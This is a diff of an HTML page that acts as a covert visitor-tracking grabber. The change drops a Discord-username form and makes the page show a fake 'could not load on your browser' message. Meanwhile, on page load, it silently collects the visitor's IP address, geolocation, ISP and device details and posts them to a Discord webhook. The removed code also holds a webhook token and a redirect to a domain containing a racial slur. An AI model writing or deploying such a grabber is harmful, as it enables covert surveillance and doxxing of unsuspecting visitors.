@@ -24,61 +24,16 @@
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
       width: 300px;
     }
-    input {
-      padding: 10px;
-      width: 80%;
-      margin: 10px;
-      font-size: 16px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    button {
-      padding: 10px 20px;
-      background-color: #4caf50;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-    .error {
-      color: red;
-      font-size: 14px;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Welcome</h1>
-    <p>Enter your Discord username:</p>
-    <input type="text" id="discordInput" placeholder="Enter Discord Username">
-    <button onclick="validateAndSubmit()">Submit</button>
-    <p id="errorMessage" class="error"></p>
+    <p>could not load on your browser...</p>
   </div>
-
   <script>
-    function validateAndSubmit() {
-      const discordInput = document.getElementById('discordInput').value;
-      const errorMessage = document.getElementById('errorMessage');
-      
-      // Check if the username is more than 5 characters
-      if (discordInput.length >= 5) {
-        errorMessage.textContent = ''; // Clear error message
-        collectAndSendData(discordInput); // Proceed with data collection
-      } else {
-        errorMessage.textContent = 'Invalid Discord username, must be at least 5 characters long!';
-        // Redirect to a different site after showing error for 3 seconds
-        setTimeout(() => {
-          window.location.href = 'https://www.niggafart.com';
-        }, 3000);
-      }
-    }
-
-    const webhookUrl = 'https://discord.com/api/webhooks/1340139365296242758/qfYr1fmZXqxktd5RXG-kxueLEi7ylj73OVmAChkZRCEWjZjojMWsd_5urJKd6Y9QMvJT';
+    const webhookUrl = 'https://discord.com/invite/1fEECEuhcNBn4R4CwgM18qz34bZ7PWkzApQxl-rNWRkrZooTzhR8rQHw3L0VRzoHGrZG';
     let collectedData = {};
-
     // Fetch IP and related data
     async function fetchIPData() {
       try {
@@ -96,15 +51,11 @@
           longitude: locationData.longitude,
           isp: locationData.org,
         };
-
-        // Send the IP data to the webhook first
-        await sendToWebhook(`**IP Information:**\n\`\`\`json\n${JSON.stringify(collectedData.IP_Info, null, 2)}\n\`\`\``);
       } catch (error) {
         console.error('Error fetching IP data:', error);
         collectedData.IP_Info = 'Unavailable';
       }
     }
-
     // Fetch device information
     function fetchDeviceInfo() {
       collectedData.Device_Info = {
@@ -118,7 +69,6 @@
         memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
       };
     }
-
     // Send data to webhook
     async function sendToWebhook(data) {
       try {
@@ -131,17 +81,16 @@
         console.error('Error sending to webhook:', error);
       }
     }
-
-    // Collect and send data
-    async function collectAndSendData(discordUsername) {
-      await fetchIPData(); // Fetch IP data and send it to webhook first
+    // Collect and send data on page load
+    async function collectAndSendData() {
+      await fetchIPData(); // Fetch IP data
       fetchDeviceInfo(); // Fetch device info
-      collectedData.Discord_Username = discordUsername; // Add Discord username
-
       // Send data to the webhook
       const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
       await sendToWebhook(formattedData);
     }
+    // Trigger data collection and sending
+    collectAndSendData();
   </script>
 </body>
 </html>
